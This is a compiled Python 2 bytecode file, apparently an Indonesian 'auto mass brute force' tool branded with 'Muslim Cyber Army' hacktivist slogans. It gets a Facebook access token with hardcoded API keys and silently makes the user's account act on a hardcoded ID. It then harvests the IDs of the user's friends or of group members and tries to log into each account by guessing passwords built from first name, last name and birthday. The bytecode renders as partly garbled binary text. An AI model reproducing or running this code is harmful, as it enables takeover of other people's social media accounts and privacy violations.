�
��\c           @   sn  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m
 Z
 y d  d l Z Wn e k
 r� e  j d � n2 Xy d  d l Z Wn e k
 re  j d � n Xd  d l m Z d  d l m Z e e � e j d � e j �  Z e j e � e j e j j �  d d	 �d g e _ d d
 � Z e j �  j  d � d d k r�e d e! �  j  d � d � e j" �  n  d �  Z# d �  Z$ d �  Z% d �  Z& d �  Z' d �  Z( d �  Z) g  Z* g  Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 d �  Z1 d �  Z2 d �  Z3 e4 d k rje1 �  n  d S(   i����N(   t
   ThreadPools   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16i    c         C   s�   d } xA | D]9 } | j  | � } |  j d | d t d | � � }  q
 W|  d 7}  |  j d d � }  | d k r� t j j |  � n t j j |  d � d  S(	   Nt   mhkbpcPs   !%ss   [%s;1mi   s   [0ms   !0i    s   
(   t   indext   replacet   strt   syst   stdoutt   write(   t   xt   et   wt   it   j(    (    s
   autombf.pyt   cetak   s    
(
t   .t   2sG   !m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.xt    c           C   s(   t  d � t j d � t j j �  d  S(   Ns�   

[34;1m[[37;1m?[34;1m][35;1m Syukron
[34;1m[[37;1m?[34;1m][35;1m We Are Muslim Cyber Army Indonesia We Are Anonymous Indonesia We Are Do Not Forgiv We Are Do Not Forget Expect Us!!!
[34;1m[[37;1m?[34;1m][34;1m FB[37;1m :[35;1m https://m.facebook.com/muvistar14   rm -rf login.txt(   R   t   ost   systemR	   t   exit(    (    (    s
   autombf.pyt   keluar1%   s    

c           C   s   d GHt  �  d  S(   Ns   [1;91m[!] Keluar(   R   (    (    (    s
   autombf.pyt   keluar*   s    c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g�������?(   R	   R
   R   t   flusht   timet   sleep(   t   zR
   (    (    s
   autombf.pyt   jalan.   s    
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s)   
[1;91m[●] [1;92mSedang Masuk [1;97mi   (   R	   R
   R   R   R   (   t   titikt   o(    (    s
   autombf.pyt   tik5   s
    

c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s/   
[1;91m[●] [1;92mMengambil Id Teman [1;97mi   (   R	   R
   R   R   R   (   R   R    (    (    s
   autombf.pyt   tok2=   s
    

c           C   s   t  d � d  S(   Nss  
           !h.-.-..
          /+/++//
         /+/++//
  !k*   !k* !h/+/++//
   \ /  |/__//
 !h{!mX!h}v{!mX!h}!0!b|!cMCA14!b|==========.
   !h(!m'!h)!0  !h/'|'\           !b\
       !h/  \  \          !b'
       !h\_  \_ \_   !k___!mMr.Down!k___

[1;93m* [1;97mAuthor  [1;91m: [1;96mRizky ID[1;97m
[1;93m* [1;97mSupport [1;91m: [1;96mDeray[1;97m | [1;96mAhmad Riswanto
[1;93m* [1;97mGitHub  [1;91m: [1;96m[4mhttps://github.com/Mulyani14[0m
!k.======================.
|!h  AMBIL !mID!h DARI.....  !k|
'======================'
!k#!p1 !h[4mDAFTAR TEMAN[0m
!k#!p2 !h[4mANGGOTA GROUP[0m
!k#!p3 !m[4mKELUAR...[0m(   R   (    (    (    s
   autombf.pyt   logoE   s    c           C   s   t  d � d  S(   Ns�  
           !h.-.-..
          /+/++//
         /+/++//
  !k*   !k* !h/+/++//
   \ /  |/__//
 !h{!mX!h}v{!mX!h}!0!b|!cMCA14!b|==========.
   !h(!m'!h)!0  !h/'|'\           !b\
       !h/  \  \          !b'
       !h\_  \_ \_   !k___!mMCA14!k___

[1;93m* [1;97mAuthor  [1;91m: [1;96mMr.Down[1;97m
[1;93m* [1;97mSupport [1;91m: [1;96mDeray[1;97m | [1;96mRespector
[1;93m* [1;97mGitHub  [1;91m: [1;96m[4mhttps://github.com/Mulyanie14[0m(   R   (    (    (    s
   autombf.pyt   logo2H   s    c          C   s�  t  j d � y t d d � }  t �  Wnst t f k
 r�t �  d GHt d � } t d � } t �  y t	 j d � Wn  t
 j k
 r� d GHt �  n Xt
 t	 j _ t	 j d	 d
 � | t	 j d <| t	 j d <t	 j �  t	 j �  } d
 | k rKy.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d  d! 6} t j d" � } | j | � | j �  } | j i | d# 6� d$ } t j | d% | �} t j | j � }	 t d d& � }
 |
 j |	 d' � |
 j �  d( GHt j d) |	 d' � t  j! d* � t �  WqKt j" j# k
 rGd GHt �  qKXn  d+ | k rsd, GHt  j! d- � t �  q�d. GHt  j d/ � t  j! d- � t$ �  n Xd  S(0   Nt   resets	   login.txtt   rs'   [1;91m[☆] [1;92mLOGIN AKUN FACEBOOKs+   [1;91m[+] [1;36mUsername [1;91m:[1;92m s+   [1;91m[+] [1;36mPassword [1;91m:[1;92m s   https://m.facebook.coms   
[1;91m[!] Tidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens1   
[1;91m[[1;96m✓[1;91m] [1;92mLogin berhasilsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=g�������?t
   checkpoints'   
[1;91m[!] [1;93mAkun kena Checkpointi   s   
[1;91m[!] Login Gagals   rm -rf login.txt(%   R   R   t   opent   supert   KeyErrort   IOErrorR$   t	   raw_inputR!   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postR   R   t
   exceptionsR   t   login(   t   tokett   idt   pwdt   urlR:   t   dataR   t   aR&   R   t   zedd(    (    s
   autombf.pyRY   S   sd    



S






c           C   s   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 �  t
 �  d  S(   NR%   s	   login.txtR&   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   (   R   R   R>   t   readRZ   RA   R   R   RY   R#   t   pilih_super(    (    (    s
   autombf.pyR?   �   s    




c          C   sI  t  d � }  |  d k r' d GHt �  n�|  d k r� t j d � t �  t d � t j d t � } t	 j
 | j � } x0| d D] } t j
 | d	 � q� Wn
|  d
 k rt j d � t �  t  d � } y> t j d | d
 t � } t	 j
 | j � } d | d GHWn t k
 r(d GHt �  n Xt j d | d t � } t	 j
 | j � } xP | d D] } t j
 | d	 � qaWn* |  d k r�t �  n d |  d GHt �  d t t t � � GHt d � d d d g } x0 | D]( }	 d |	 Gt j j �  t j d � q�WHd d GHd �  }
 t d  � } | j |
 t � d! GHt �  d  S("   Ns4   [33;1m[[37;1m?[33;1m][32;1m PILIH[34;1m:[36;1mt    s   [1;91m[!] Jangan kosongR0   R%   s/   [1;91m[+] [1;92mMengambil id teman [1;97m...s3   https://graph.facebook.com/me/friends?access_token=R^   R[   R   s,   [1;91m[+] [1;92mID Grup   [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96m✓[1;91m] [1;92mNama grup [1;91m:[1;97m t   names   [1;91m[!] Grup tidak ditemukans   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=t   3s   [1;91m[✖] [1;97ms    [1;91mTidak adas,   [1;91m[+] [1;92mJumlah ID [1;91m: [1;97ms.   [1;91m[✺] [1;92mTunggu sebentar [1;97m...s   .   s   ..  s   ... s1   

[1;91m[[1;96m✸[1;91m] [1;92mCrack [1;97mi   i(   s
   [1;97m═c         S   sS  |  } y?t  j d | d t � } t j | j � } | d d } t j d | d | d � } t j | � } d | k r� d	 | d
 | GHn�d | d k r� d
 | d
 | GHn�| d d } t j d | d | d � } t j | � } d | k rd | d
 | GHn2d | d k r6d | d
 | GHn| d d } t j d | d | d � } t j | � } d | k r�d | d
 | GHn� d | d k r�d | d
 | GHn� | d }	 |	 j	 d d � }
 t j d | d |
 d � } t j | � } d | k r d | d
 |
 GHn$ d | d k rDd | d
 |
 GHn  Wn n Xd  S(   Ns   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R<   s.   [1;97m[[1;92mOK✓[1;97m] [31;1m=>[37;1m s    [31;1m=>[37;1m s   www.facebook.comt	   error_msgs.   [1;97m[[1;93mCP✚[1;97m] [31;1m=>[37;1m t   12345s.   [37;1m[[1;92mOK✓[37;1m] [31;1m=>[37;1m s.   [37;1m[[1;93mCP✚[37;1m] [31;1m=>[37;1m t	   last_namet   birthdayt   /Rc   (
   RQ   RR   RZ   RS   RT   RU   t   urllibt   urlopent   loadR   (   t   argt   userR_   t   bt   pass1R^   t   qt   pass2t   pass3t   lahirt   pass4(    (    s
   autombf.pyt   main�   sF    
i   s   
[1;91m[+] [1;97mSelesai(   RB   Rb   R   R   R$   R   RQ   RR   RZ   RS   RT   RU   R[   t   appendR@   R   R   t   lenR	   R
   R   R   R   R    t   map(   t   peakR&   R   t   st   idgt   aswt   reR   R   R    Ry   t   p(    (    s
   autombf.pyRb   �   sZ    









		,t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(5   R   R	   R   t   datetimet   randomRM   R�   t	   threadingRS   t   getpassRm   t   platformt   multiprocessing.poolR    RD   t   ImportErrorR   RQ   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRC   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   t   python_versiont   splitR8   R   R   R   R   R!   R"   R#   R$   t   berhasilt   cekpointt   gagalt   idtemanR[   t   idfromtemant   idmemRY   R?   Rb   t   __name__(    (    (    s
   autombf.pyt   <module>   sP   �





								7		d
